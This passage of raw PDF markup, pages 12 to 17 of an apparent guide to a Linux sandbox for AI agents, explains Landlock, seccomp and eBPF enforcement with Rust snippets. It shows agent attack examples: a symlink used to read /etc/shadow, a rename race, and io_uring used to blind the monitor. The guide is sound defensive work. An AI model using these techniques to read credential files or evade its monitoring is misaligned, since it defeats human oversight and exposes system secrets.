+1 0 0 1 54 478 Tm
+(Agent: ln -s /etc/shadow /tmp/harmless && cat /tmp/harmless) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 466 Tm
+(Landlock: kernel resolves to inode of /etc/shadow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 454 Tm
+(          ? inode not in Landlock allow set ? -EACCES) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 442 Tm
+(Agent gets: "Permission denied" ? ATTACK BLOCKED) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 416 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 398 Tm
+(5. TOCTOU: The Time-of-Check-to-Time-of-Use Race) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 370 Tm
+(5.1 What Is a TOCTOU Attack?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 347 Tm
+(TOCTOU \(Time-of-Check-to-Time-of-Use\) is a race condition where the system checks a) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 332 Tm
+(condition at one moment, then acts on it at a later moment ? and an attacker changes) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 317 Tm
+(things in between.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 292 Tm
+(Real-world analogy:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 267 Tm
+(1. Security guard checks your ID at the door \(TIME OF CHECK\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 246 Tm
+(2. You walk through the lobby toward the vault \(TIME GAP\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 225 Tm
+(3. During the walk, someone swaps your ID badge with a fake one) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 204 Tm
+(4. You present the badge at the vault \(TIME OF USE\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 183 Tm
+(5. The vault sees a valid badge and opens) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 162 Tm
+(5.2 Why Tracepoint-Based Checking Is Vulnerable) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 139 Tm
+(Time T1: Tracepoint fires, reads filename from userspace memory) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 127 Tm
+(         path = "/tmp/safe-file.txt") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 115 Tm
+(         Policy check: allowed ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 103 Tm
+(         Does NOT set PENDING_DENY) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 12 of 40) Tj
+ET
+endstream
+endobj
+16 0 obj
+<< /Length 3776 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(                ???????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(Time T2:        ? ATTACKER THREAD runs simultaneously: ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(                ? rename\("/tmp/safe-file.txt",         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(                ?        "/tmp/backup.txt"\)            ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(                ? rename\("/etc/shadow",                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(                ?        "/tmp/safe-file.txt"\)         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(                ???????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(                The path now points to /etc/shadow!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(Time T3: file_open LSM fires) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(         PENDING_DENY is empty ? allows access) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(         But the file at "/tmp/safe-file.txt" is now /etc/shadow!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(         ? SECURITY BREACH) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 568 Tm
+(5.3 The Fix: LSM-Only Enforcement) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 545 Tm
+(When policy evaluation happens inside the LSM hook using bpf_d_path\(\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 520 Tm
+(Time T1: Tracepoint fires \(used for logging/audit only, no enforcement\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 496 Tm
+(Time T2: Attacker renames files \(doesn't matter!\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 472 Tm
+(Time T3: file_open LSM fires) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 460 Tm
+(         bpf_d_path\(\) reads the ACTUAL file the kernel has already resolved) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 448 Tm
+(         This is the inode the kernel committed to ? it cannot change) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 436 Tm
+(         Policy check against resolved path: /etc/shadow ? DENIED) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 424 Tm
+(         ? ATTACK BLOCKED) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 404 Tm
+(The key insight: by Time T3, the kernel has already decided which file to open.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 389 Tm
+(bpf_d_path\(\) reads this committed decision. The attacker's rename happened on a) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 374 Tm
+(different dentry ? it does not affect the file handle the kernel already resolved.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 349 Tm
+(Landlock provides even stronger protection because it operates on inodes \(the underlying) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 334 Tm
+(file identity\), not paths at all. An inode is a unique number assigned to each file on) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 319 Tm
+(disk. No matter how many names \(paths, symlinks, hardlinks\) point to it, the inode is) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 304 Tm
+(always the same.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 273 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 255 Tm
+(6. Landlock: Inode-Level Filesystem Sandbox) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 227 Tm
+(6.1 What Is Landlock?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 204 Tm
+(Landlock is a Linux security module \(available since Linux 5.13\) that allows) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 189 Tm
+(unprivileged processes to sandbox themselves. Unlike traditional LSMs \(AppArmor,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 174 Tm
+(SELinux\) which require root to configure, Landlock is designed for self-restriction.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 149 Tm
+(Think of it as a process saying: "From this point forward, I can only access these) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 134 Tm
+(specific files and directories. I cannot undo this restriction.") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 109 Tm
+(BEFORE Landlock:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 97 Tm
+(  Process can access:  everything the user can access) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 13 of 40) Tj
+ET
+endstream
+endobj
+17 0 obj
+<< /Length 3400 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(  /etc/shadow         ? \(if user has permission\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(  /home/user/*        ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(  /tmp/*              ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(  Network: any port   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(AFTER Landlock restrict_self\(\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(  Process can access:  ONLY what was explicitly allowed) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(  /etc/shadow         ? BLOCKED \(not in allow set\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(  /home/user/project  ? \(explicitly allowed\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(  /tmp/*              ? \(explicitly allowed\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(  Network: port 443   ? \(explicitly allowed\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(  Network: port 22    ? BLOCKED) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 580 Tm
+(6.2 Why Is It Symlink-Immune?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 557 Tm
+(Landlock operates on inodes, not path strings. When you add a rule allowing access to) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 542 Tm
+(/tmp, Landlock:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 517 Tm
+(1. Opens /tmp to get a file descriptor) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 496 Tm
+(2. Resolves the file descriptor to the inode of the /tmp directory) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 475 Tm
+(3. Stores: "allow access to inode #54321 and its children") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 454 Tm
+(When a process later accesses a file:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 429 Tm
+(1. The kernel resolves the path to an inode \(following all symlinks\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 408 Tm
+(2. Landlock checks: "is this inode, or any of its parent inodes, in the allow set?") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 387 Tm
+(3. If not: -EACCES) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 366 Tm
+(Attack: ln -s /etc/shadow /tmp/harmless) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 342 Tm
+(Landlock allow set: { inode\(/tmp\), inode\(/home/user/project\) }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 318 Tm
+(Agent opens "/tmp/harmless":) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 306 Tm
+(  1. Kernel resolves: /tmp/harmless ? symlink ? /etc/shadow ? inode #12345) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 294 Tm
+(  2. Landlock checks: is inode #12345 under inode\(/tmp\)? NO) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 282 Tm
+(     \(inode #12345 belongs to /etc/shadow, which is under /etc/\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 270 Tm
+(  3. Is inode #12345 under inode\(/home/user/project\)? NO) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 258 Tm
+(  4. Result: -EACCES ? BLOCKED) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 234 Tm
+(The symlink is irrelevant ? Landlock never looks at the path string.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 214 Tm
+(6.3 How Guardian Shell Applies Landlock) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 191 Tm
+(Guardian applies Landlock in guardian-launch \(the agent launcher\) before exec'ing the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 176 Tm
+(agent. The code is in guardian-launch/src/main.rs:309-435.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 151 Tm
+(Step 1: Require default-deny policy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 126 Tm
+(if config.file_default != "deny" {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 114 Tm
+(    log::warn!\("Landlock skipped: file_access.default='{}' \(requires 'deny'\)", ...\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 102 Tm
+(    return Ok\(\(\)\); // Landlock is inherently default-deny; skip if policy is default-allow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 90 Tm
+(}) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 14 of 40) Tj
+ET
+endstream
+endobj
+18 0 obj
+<< /Length 3639 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 724 Tm
+(Step 2: Create ruleset with filesystem rights) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 699 Tm
+(let fs_access = AccessFs::from_all\(abi\); // All filesystem operations to control) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 687 Tm
+(let mut ruleset = Ruleset::default\(\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 675 Tm
+(    .handle_access\(fs_access\)?    // Control file access) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 663 Tm
+(    .handle_access\(AccessNet::ConnectTcp\)?  // Control TCP connections) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 651 Tm
+(    .create\(\)?;) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 631 Tm
+(Step 3: Add system paths needed for basic operation) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 606 Tm
+(Every process needs certain files just to start \(shared libraries, DNS config, device) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 591 Tm
+(files\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 566 Tm
+(let system_read_paths = [) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 554 Tm
+(    "/usr/lib", "/usr/lib64", "/lib", "/lib64",   // Shared libraries) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 542 Tm
+(    "/usr/share",                                   // Data files) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 530 Tm
+(    "/etc/ld.so.cache", "/etc/ld.so.conf",         // Dynamic linker config) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 518 Tm
+(    "/etc/resolv.conf", "/etc/hosts",              // DNS resolution) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 506 Tm
+(    "/etc/nsswitch.conf",                          // Name service switch) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 494 Tm
+(    "/etc/passwd", "/etc/group",                   // User/group lookups) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 482 Tm
+(    "/dev/null", "/dev/zero",                      // Standard devices) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 470 Tm
+(    "/dev/urandom", "/dev/random",                 // Random number generators) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 458 Tm
+(];) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 434 Tm
+(for path in &system_read_paths {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 422 Tm
+(    if Path::new\(path\).exists\(\) {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 410 Tm
+(        let fd = PathFd::new\(path\)?;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 398 Tm
+(        ruleset = ruleset.add_rule\() Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 386 Tm
+(            PathBeneath::new\(fd, read_exec_rights\)  // Read + execute \(no write!\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 374 Tm
+(        \)?;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 362 Tm
+(    }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 350 Tm
+(}) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 330 Tm
+(Step 4: Add agent's allowed paths from policy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 305 Tm
+(for pattern in &config.file_allow {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 293 Tm
+(    let base_path = strip_glob\(pattern\);  // "/tmp/**" ? "/tmp") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 281 Tm
+(    if Path::new\(&base_path\).exists\(\) {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 269 Tm
+(        let fd = PathFd::new\(&base_path\)?;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 257 Tm
+(        ruleset = ruleset.add_rule\() Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 245 Tm
+(            PathBeneath::new\(fd, read_rights | write_rights\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 233 Tm
+(        \)?;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 221 Tm
+(    }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 209 Tm
+(}) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 189 Tm
+(Step 5: Irreversible enforcement) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 164 Tm
+(let status = ruleset.restrict_self\(\)?;  // IRREVERSIBLE ? cannot be undone) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 144 Tm
+(After this call, the process \(and all its children after exec\) cannot access any file) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 129 Tm
+(not in the allow set. The process cannot remove or weaken this restriction.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 104 Tm
+(6.4 Default-Deny Model) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 15 of 40) Tj
+ET
+endstream
+endobj
+19 0 obj
+<< /Length 3541 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(Landlock is fundamentally default-deny. You don't tell it what to block ? you tell it) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(what to allow, and everything else is blocked. This is the opposite of a blocklist) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 702 Tm
+(approach:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 677 Tm
+(Blocklist approach \(eBPF deny rules\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 665 Tm
+(  "Block /etc/shadow, /etc/sudoers, /root/**") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 653 Tm
+(  Problem: What about /etc/ssl/private? /var/lib/mysql? You'll miss something.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 629 Tm
+(Allowlist approach \(Landlock\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 617 Tm
+(  "Allow /tmp/**, /home/user/project/**, /proc/self/**") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 605 Tm
+(  Everything else is automatically blocked ? including paths you didn't think of.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 585 Tm
+(This is why Guardian's Landlock integration only works with file_access.default =) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 570 Tm
+("deny". An agent configured with default = "allow" cannot use Landlock because the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 555 Tm
+(models are incompatible.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 530 Tm
+(6.5 Network Port Filtering \(Kernel 6.7+\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 507 Tm
+(Landlock ABI v4 \(Linux 6.7\) adds TCP connect filtering:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 482 Tm
+(if has_net {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 470 Tm
+(    for &port in &config.net_allow_ports {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 458 Tm
+(        ruleset = ruleset.add_rule\() Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 446 Tm
+(            NetPort::new\(port, AccessNet::ConnectTcp\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 434 Tm
+(        \)?;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 422 Tm
+(    }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 410 Tm
+(}) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 390 Tm
+(This restricts which TCP ports the agent can connect to. For example, allowing only) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 375 Tm
+(ports 80 and 443 blocks SSH \(22\), database \(3306, 5432\), and all other outbound) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 360 Tm
+(connections.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 335 Tm
+(Limitation: Landlock TCP filtering only covers connect\(\) calls. Raw UDP sendto\(\) without) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 320 Tm
+(prior connect\(\) is not filtered.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 295 Tm
+(6.6 The Full Sandbox Sequence) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 272 Tm
+(The complete order of operations in guardian-launch:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 247 Tm
+(1. Create cgroup \(/sys/fs/cgroup/guardian/agent-12345\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 235 Tm
+(2. Enable controllers \(memory, pids, cpu\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 223 Tm
+(3. Set resource limits \(memory.max, pids.max, cpu.max\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 211 Tm
+(4. Get cgroup ID \(inode number of cgroup directory\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 199 Tm
+(5. Register with Guardian daemon via IPC) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 187 Tm
+(   ?? Daemon responds with SandboxConfig containing policy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 175 Tm
+(6. Move self into cgroup \(write PID to cgroup.procs\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 151 Tm
+(7. PR_SET_NO_NEW_PRIVS                      ? Required by Landlock) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 139 Tm
+(   ?? Prevents SUID binaries from gaining elevated privileges) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 115 Tm
+(8. LANDLOCK restrict_self\(\)                  ? Inode-level filesystem sandbox) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 103 Tm
+(   ?? Irreversible, inherited by exec'd process) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 16 of 40) Tj
+ET
+endstream
+endobj
+20 0 obj
+<< /Length 3419 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(9. SECCOMP apply_filter\(\)                    ? Block dangerous syscalls) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(   ?? Inherited by exec'd process) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(10. exec\(agent_command\)                      ? Replace launcher with agent) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(    ?? Agent inherits: cgroup + Landlock + seccomp + no_new_privs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(    ?? Agent CANNOT escape any of these) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 646 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 628 Tm
+(7. Seccomp: Blocking Dangerous Syscalls) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 600 Tm
+(7.1 What Is Seccomp?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 577 Tm
+(Seccomp \(Secure Computing Mode\) is a Linux kernel feature that restricts which syscalls) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 562 Tm
+(a process can make. It uses BPF \(the same bytecode format as eBPF, but simpler\) to) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 547 Tm
+(filter syscalls at the kernel entry point.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 522 Tm
+(Process calls a syscall) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 510 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 498 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 486 Tm
+(Seccomp BPF filter evaluates:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 474 Tm
+(  Is this syscall in the blocked list?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 462 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 450 Tm
+(    ???????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 438 Tm
+(    ? YES     ? NO) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 426 Tm
+(    ?         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 414 Tm
+(  Return    Allow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 402 Tm
+(  -EPERM    through) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 382 Tm
+(Seccomp filters are:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 357 Tm
+(- Inherited by all child processes \(via fork\(\) and exec\(\)\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 336 Tm
+(- Cannot be removed once applied \(only made more restrictive\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 315 Tm
+(- Very low overhead ? runs before any syscall logic) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 294 Tm
+(7.2 io_uring ? The Invisible File I/O Bypass) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 271 Tm
+(The attack:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 246 Tm
+(io_uring is a high-performance asynchronous I/O interface \(Linux 5.1+\). It bypasses the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 231 Tm
+(normal openat\(\) ? read\(\) syscall path entirely. Instead, operations are submitted to a) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 216 Tm
+(shared ring buffer and processed by the kernel without individual syscalls.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 191 Tm
+(Normal file read \(Guardian can see this\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 179 Tm
+(  Application ? openat\(\) syscall ? eBPF tracepoint fires ? Guardian monitors) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 167 Tm
+(                read\(\)  syscall ? eBPF tracepoint fires ? Guardian monitors) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 143 Tm
+(io_uring file read \(Guardian CANNOT see this\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 131 Tm
+(  Application ? io_uring_setup\(\) ? creates submission queue) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 119 Tm
+(              ? io_uring_enter\(\) ? submits OPEN + READ operations) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 107 Tm
+(              ? Kernel processes them internally) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 95 Tm
+(              ? No openat\(\) or read\(\) syscalls ever fire) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 17 of 40) Tj
+ET
+endstream
+endobj
+21 0 obj
+<< /Length 3473 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(              ? eBPF tracepoints never trigger) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(              ? Guardian is completely blind!) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 700 Tm
+(The fix: Block io_uring syscalls via seccomp) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 675 Tm
+(// Syscall numbers \(x86_64\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 663 Tm
+(const SYS_IO_URING_SETUP: i64 = 425;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 651 Tm
+(const SYS_IO_URING_ENTER: i64 = 426;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 639 Tm
+(const SYS_IO_URING_REGISTER: i64 = 427;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 615 Tm
+(// These are blocked with EPERM ? the agent gets "Operation not permitted") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 603 Tm
+(// and must fall back to normal read\(\)/write\(\) which Guardian CAN monitor) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 583 Tm
+(7.3 memfd_create + execveat ? Fileless Execution) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 560 Tm
+(The attack:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 535 Tm
+(memfd_create\(\) creates a file that exists only in memory ? it has no path on the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 520 Tm
